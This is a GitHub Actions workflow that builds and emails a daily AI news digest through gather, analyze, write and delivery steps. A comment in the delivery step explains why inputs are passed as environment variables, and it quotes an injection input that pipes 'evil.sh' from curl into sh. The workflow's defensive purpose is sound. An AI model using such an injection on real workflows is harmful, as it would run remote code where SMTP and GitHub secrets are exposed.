name: Daily AI News Digest

on:
  schedule:
    # 07:13 UTC every day. Off-the-hour on purpose: GitHub delays cron jobs
    # that land on :00 because everyone schedules there.
    - cron: "13 7 * * *"
  workflow_dispatch:
    inputs:
      hours:
        description: "Lookback window in hours"
        required: false
        default: "24"
      send_email:
        description: "Send the email (false = write files only)"
        required: false
        default: "true"

permissions:
  contents: write

concurrency:
  group: daily-ai-news
  cancel-in-progress: false

env:
  HOURS: ${{ github.event.inputs.hours || '24' }}

jobs:
  digest:
    runs-on: ubuntu-latest
    timeout-minutes: 15

    # Four stages, one per step - mirrors the 3-agent pipeline
    # (gatherer -> analyst -> writer) plus delivery. Each stage's output is
    # uploaded as a short-lived artifact so you can inspect exactly what the
    # analyst kept/dropped, or what the writer produced, without re-running
    # the whole pipeline - useful while the ranking logic keeps evolving.
    #
    # Every step runs a single-stage event bus (see ainews/events.py) and
    # replays the previous step's JSON as the event it would have received
    # in-process, so these steps and a plain `ai-news` run exercise the same
    # handlers. Add --trace to any step to log each event as it is dispatched.
    steps:
      - name: Check out repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - name: Install
        run: pip install -e ".[dev]"

      # Cheaper to catch a broken pipeline here than to find out by not
      # receiving an email, or by receiving a wrong one.
      - name: Run tests
        run: pytest

      - name: "Agent 1: Gather stories"
        run: ai-news gather --out raw.json

      - name: Upload raw stories
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: raw-stories
          path: raw.json
          retention-days: 7
          if-no-files-found: ignore

      - name: "Agent 2: Analyze, rank, and dedupe"
        run: ai-news analyze --in raw.json --out ranked.json --hours "$HOURS" --max-items 35

      - name: Upload ranked stories
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ranked-stories
          path: ranked.json
          retention-days: 7
          if-no-files-found: ignore

      - name: "Agent 3: Write commentary"
        env:
          # Optional voice layer. With neither key set, both files come out
          # empty and delivery falls back to the plain link digest.
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          LLM_MODEL: ${{ vars.LLM_MODEL }}
        run: ai-news write --in ranked.json --out-simple simple.md --out-deep deep.md

      - name: Upload commentary
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: commentary
          path: |
            simple.md
            deep.md
          retention-days: 7
          if-no-files-found: ignore

      # Fails the step if the email was configured and did not send. Nothing
      # is marked seen in that case, so the next run picks the same stories
      # up again rather than losing them - see ainews/delivery/commit.py.
      - name: Deliver the digest
        env:
          SMTP_HOST: ${{ secrets.SMTP_HOST || 'smtp.gmail.com' }}
          SMTP_PORT: ${{ secrets.SMTP_PORT || '587' }}
          SMTP_USER: ${{ secrets.SMTP_USER }}
          SMTP_PASSWORD: ${{ secrets.SMTP_PASSWORD }}
          MAIL_FROM: ${{ secrets.MAIL_FROM }}
          MAIL_TO: ${{ secrets.MAIL_TO || 'Taha.mmtlmu@gmail.com' }}
          # Workflow inputs reach the shell as an environment variable, never
          # as a ${{ }} expression inside `run:`. GitHub substitutes those
          # expressions into the script *as text* before bash sees it, so a
          # dispatch input of `"; curl evil.sh | sh; #` would execute here -
          # in the one step that holds SMTP_PASSWORD and GITHUB_TOKEN.
          SEND_EMAIL: ${{ github.event.inputs.send_email }}
        run: |
          if [ "$SEND_EMAIL" = "false" ]; then
            ai-news deliver --in ranked.json --simple simple.md --deep deep.md --hours "$HOURS" --no-email
          else
            ai-news deliver --in ranked.json --simple simple.md --deep deep.md --hours "$HOURS"
          fi

      - name: Commit today's digest
        run: |
          git config user.name  "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          # --ignore-errors: the state files may not exist on a first run,
          # and a missing one must not fail the step.
          git add --ignore-errors "see news" latest.md .seen.json .feed-health.json || true
          if git diff --staged --quiet; then
            echo "No new digest to commit."
          else
            git commit -m "AI news digest: $(date -u +%Y-%m-%d)"
            git push
          fi

      - name: Upload digest as artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ai-news-digest
          path: see news/
          retention-days: 30
          if-no-files-found: ignore

      # The full event log of the run: what the gatherer saw, what the analyst
      # kept, what the writer produced, in order. `ai-news replay <file>`
      # re-delivers from it without refetching or paying for another LLM call.
      - name: Upload run journal
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: run-journal
          path: runs/
          retention-days: 14
          if-no-files-found: ignore
